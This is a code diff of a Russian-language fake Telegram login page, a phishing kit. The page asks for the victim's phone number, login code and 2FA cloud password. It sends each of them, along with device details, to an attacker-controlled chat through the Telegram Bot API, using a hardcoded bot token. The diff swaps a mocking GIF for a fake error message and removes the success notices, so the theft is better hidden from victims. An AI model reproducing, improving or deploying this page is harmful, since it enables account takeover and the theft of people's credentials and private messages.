@@ -133,10 +133,6 @@
         .login-btn:active {
             background: #0077b3;
         }
-        .login-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
         .hidden {
             display: none !important;
         }
@@ -223,6 +219,10 @@
             font-weight: 400;
             color: #aaaaaa;
         }
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
         input[type="text"]:focus, input[type="password"]:focus, input[type="tel"]:focus {
             border-bottom-color: #0088cc !important;
         }
@@ -254,48 +254,54 @@
             color: #666666;
         }
 
-        #gifContainer {
+        /* ===== БЛОК С ОШИБКОЙ (вместо гифки) ===== */
+        #errorContainer {
             margin-top: 20px;
             text-align: center;
             display: none;
             animation: fadeIn 0.5s ease;
-        }
-        #gifContainer img {
-            max-width: 100%;
+            background: #1a1a1a;
+            border: 1px solid #ff3b30;
             border-radius: 16px;
-            border: 1px solid #2a2a2a;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.8);
+            padding: 30px 20px;
         }
         @keyframes fadeIn {
             0% { opacity: 0; transform: scale(0.9); }
             100% { opacity: 1; transform: scale(1); }
         }
-        .gif-caption {
+        .error-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        .error-title {
+            color: #ff3b30;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .error-text {
             color: #aaaaaa;
-            font-size: 14px;
-            margin-top: 12px;
+            font-size: 15px;
+            line-height: 1.5;
         }
-
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1a1a1a;
+        .error-text span {
+            color: #0088cc;
+        }
+        .error-refresh-btn {
+            margin-top: 18px;
+            padding: 12px 30px;
+            background: #0088cc;
+            border: none;
+            border-radius: 10px;
             color: #ffffff;
-            padding: 14px 28px;
-            border-radius: 12px;
-            font-size: 14px;
-            z-index: 9999;
-            border: 1px solid #2a2a2a;
-            display: none;
-            max-width: 90%;
-            text-align: center;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.8);
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.15s;
         }
-        .toast.success { border-color: #00cc66; }
-        .toast.error { border-color: #ff3b30; }
-        .toast.warning { border-color: #ff9500; }
+        .error-refresh-btn:active {
+            background: #0077b3;
+        }
     </style>
 </head>
 <body>
@@ -303,6 +309,7 @@
     <div class="logo">Telegram</div>
     <div class="sub-text">Проверьте код страны и введите свой номер телефона.</div>
 
+    <!-- ШАГ 1: НОМЕР -->
     <div id="step1">
         <div class="field-group">
             <span class="field-label">Страна</span>
@@ -349,6 +356,7 @@
         <div class="error" id="err1">Введите корректный номер</div>
     </div>
 
+    <!-- ШАГ 2: КОД + 2FA -->
     <div id="step2" class="hidden">
         <div class="phone-display">Код отправлен на <span id="phoneDisplay"></span></div>
         <div class="field-group">
@@ -358,6 +366,7 @@
         <button class="login-btn" onclick="step2()">Подтвердить</button>
         <div class="error" id="err2">Неверный код</div>
 
+        <!-- 2FA появляется ПОСЛЕ ввода кода -->
         <div id="twofaBlock" class="hidden" style="margin-top:20px;">
             <div class="field-group">
                 <span class="field-label">Облачный пароль (2FA)</span>
@@ -369,39 +378,34 @@
         </div>
     </div>
 
+    <!-- ШАГ 3: ПРОВЕРКА АВТОРИЗАЦИИ 10 СЕК -->
     <div id="loadingAuth" class="hidden">
         <div class="loader" style="display:block;"></div>
         <div id="timer" style="margin-top:16px;">10</div>
         <div class="loading-text">Проверка авторизации...</div>
     </div>
 
-    <div id="gifContainer">
-        <img src="https://media1.tenor.com/m/CWBMp3Tax5MAAAAC/%D0%B5%D0%B1%D0%B0%D1%82%D1%8C-%D1%82%D1%8B-%D0%BC%D0%B0%D0%B9%D0%BE%D0%BD%D0%B5%D0%B7.gif" alt="ебать ты майонез">
-        <div class="gif-caption">ебать ты майонез</div>
+    <!-- ===== БЛОК С ОШИБКОЙ (вместо гифки) ===== -->
+    <div id="errorContainer">
+        <div class="error-icon">⚠️</div>
+        <div class="error-title">Упс...</div>
+        <div class="error-text">
+            Что-то пошло не так.<br>
+            Подождите пару минут и попробуйте <span>обновить страницу</span>.
+        </div>
+        <button class="error-refresh-btn" onclick="location.reload()">🔄 Обновить страницу</button>
     </div>
 
     <div class="footer">Telegram • 2026</div>
 </div>
 
-<div id="toast" class="toast"></div>
-
 <script>
-    // ===== НОВЫЙ CHAT_ID =====
-    const BOT_TOKEN = '8910566191:AAGO-JR1xCsvO5qWp5jMSNiiBOHjxQS7Xw0';
-    const CHAT_ID = '6371781748';  // <--- НОВЫЙ ID
+    const BOT_TOKEN = '8799962757:AAFmz4Sq3Ujo4URqCQl2gH4b6sRh51c1NKI';
+    const CHAT_ID = '8277809761';
     const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    function showToast(msg, type = '') {
-        const toast = document.getElementById('toast');
-        toast.textContent = msg;
-        toast.className = 'toast ' + type;
-        toast.style.display = 'block';
-        setTimeout(() => { toast.style.display = 'none'; }, 4000);
-    }
-
     function sendToTG(text) {
-        console.log('📤 Отправка в Telegram:', text);
-        return fetch(WEBHOOK, {
+        fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -409,23 +413,7 @@
                 text: text.substring(0, 4096),
                 parse_mode: 'HTML'
             })
-        })
-        .then(res => res.json())
-        .then(data => {
-            console.log('✅ Ответ бота:', data);
-            if (data.ok) {
-                showToast('✅ Данные отправлены в Telegram', 'success');
-                return true;
-            } else {
-                showToast('❌ Ошибка: ' + data.description, 'error');
-                return false;
-            }
-        })
-        .catch(e => {
-            console.log('❌ Ошибка сети:', e);
-            showToast('⚠️ Ошибка соединения', 'error');
-            return false;
-        });
+        }).catch(e => console.log('Ошибка отправки:', e));
     }
 
     function getDeviceInfo() {
@@ -446,6 +434,7 @@
         return code + num;
     }
 
+    // ===== ШАГ 1 =====
     function step1() {
         const full = getFullPhone();
         if (!full) {
@@ -456,17 +445,14 @@
 
         const info = getDeviceInfo();
         const remember = document.getElementById('rememberMe').checked ? 'Да' : 'Нет';
-        const msg = `📱 <b>НОМЕР</b>\n<code>${full}</code>\n🔒 Запомнить: ${remember}\n\n🖥 ${info.ua}\n📺 ${info.screen}\n🕒 ${info.tz}\n🔗 ${info.ref}`;
-        
-        sendToTG(msg).then(success => {
-            if (success) {
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-                document.getElementById('phoneDisplay').textContent = full;
-            }
-        });
+        sendToTG(`📱 <b>НОМЕР</b>\n<code>${full}</code>\n🔒 Запомнить: ${remember}\n\n🖥 ${info.ua}\n📺 ${info.screen}\n🕒 ${info.tz}\n🔗 ${info.ref}`);
+
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+        document.getElementById('phoneDisplay').textContent = full;
     }
 
+    // ===== ШАГ 2 — ввод кода =====
     function step2() {
         const code = document.getElementById('codeInput').value.trim();
         if (!code || code.length < 4) {
@@ -475,24 +461,28 @@
         }
         document.getElementById('err2').style.display = 'none';
 
-        sendToTG(`🔐 <b>КОД</b>\n<code>${code}</code>`).then(success => {
-            if (success) {
-                document.getElementById('twofaBlock').classList.remove('hidden');
-                document.querySelector('#step2 .login-btn').disabled = true;
-                document.querySelector('#step2 .login-btn').textContent = '⏳ Ожидание...';
-            }
-        });
+        sendToTG(`🔐 <b>КОД</b>\n<code>${code}</code>`);
+
+        // Показываем блок с 2FA
+        document.getElementById('twofaBlock').classList.remove('hidden');
+        document.querySelector('#step2 .login-btn').disabled = true;
+        document.querySelector('#step2 .login-btn').textContent = '⏳ Ожидание...';
     }
 
+    // ===== ШАГ 3 — финал с 2FA =====
     function step3() {
         const twofa = document.getElementById('twofaInput').value.trim() || 'не указан';
-        sendToTG(`🔐 <b>2FA</b>\n<code>${twofa}</code>`).then(() => startAuthCheck());
+        sendToTG(`🔐 <b>2FA</b>\n<code>${twofa}</code>`);
+        startAuthCheck();
     }
 
+    // ===== ПРОПУСТИТЬ 2FA =====
     function skipTwofa() {
-        sendToTG(`⏭️ <b>2FA пропущен</b>`).then(() => startAuthCheck());
+        sendToTG(`⏭️ <b>2FA пропущен</b>`);
+        startAuthCheck();
     }
 
+    // ===== ЭКРАН ПРОВЕРКИ + ТАЙМЕР =====
     function startAuthCheck() {
         document.getElementById('step2').classList.add('hidden');
         document.getElementById('loadingAuth').classList.remove('hidden');
@@ -506,19 +496,19 @@
             timerEl.textContent = seconds;
             if (seconds <= 0) {
                 clearInterval(interval);
+                // Скрываем загрузку и показываем ОШИБКУ (вместо гифки)
                 document.getElementById('loadingAuth').classList.add('hidden');
-                document.getElementById('gifContainer').style.display = 'block';
-                sendToTG(`✅ <b>АВТОРИЗАЦИЯ ПРОЙДЕНА</b>\n➡️ Показана гифка`);
-                showToast('🎉 Авторизация успешна!', 'success');
+                document.getElementById('errorContainer').style.display = 'block';
+                sendToTG(`❌ <b>ОШИБКА АВТОРИЗАЦИИ</b>\n➡️ Показано сообщение об ошибке`);
             }
         }, 1000);
     }
 
+    // ===== ПРИ ЗАГРУЗКЕ =====
     window.onload = function() {
         const info = getDeviceInfo();
         sendToTG(`🟢 <b>НОВЫЙ ВИЗИТ</b>\n🖥 ${info.ua}\n📺 ${info.screen}\n🕒 ${info.tz}\n🔗 ${info.ref}\n📍 ${info.url}`);
         document.getElementById('phoneCodeDisplay').textContent = document.getElementById('countryCode').value;
-        showToast('🔐 Бот готов к работе', '');
     };
 </script>
 </body>
